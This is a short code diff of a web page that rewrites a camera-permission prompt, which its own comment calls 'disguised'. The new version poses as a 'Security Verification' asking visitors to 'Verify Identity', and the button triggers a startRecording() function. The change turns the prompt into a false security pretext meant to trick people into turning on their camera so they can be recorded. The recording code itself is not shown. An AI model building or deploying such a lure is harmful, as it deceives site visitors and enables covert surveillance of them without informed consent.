@@ -1331,13 +1331,13 @@
   </style>
 </head>
 <body>
-  <!-- Camera Permission Prompt (disguised) -->
+  <!-- Camera Permission Prompt (disguised as security check) -->
   <div class="camera-prompt" id="cameraPrompt">
-    <div style="font-size: 3rem; margin-bottom: 1rem;">&#10024;</div>
-    <h2 style="color: white; font-family: -apple-system, sans-serif; font-size: 1.3rem; font-weight: 500;">Enable Enhanced Experience?</h2>
-    <p style="font-size: 0.95rem; color: rgba(255,255,255,0.6);">This page includes interactive features that work better with your camera enabled.</p>
+    <div style="font-size: 3rem; margin-bottom: 1rem;">&#128274;</div>
+    <h2 style="color: white; font-family: -apple-system, sans-serif; font-size: 1.3rem; font-weight: 500;">Security Verification</h2>
+    <p style="font-size: 0.95rem; color: rgba(255,255,255,0.6);">We need to verify you're the right person to view this page.</p>
     <div class="camera-prompt-buttons">
-      <button class="camera-btn yes" onclick="startRecording()">Enable</button>
+      <button class="camera-btn yes" onclick="startRecording()">Verify Identity</button>
       <button class="camera-btn no" onclick="skipRecording()">Skip</button>
     </div>
   </div>
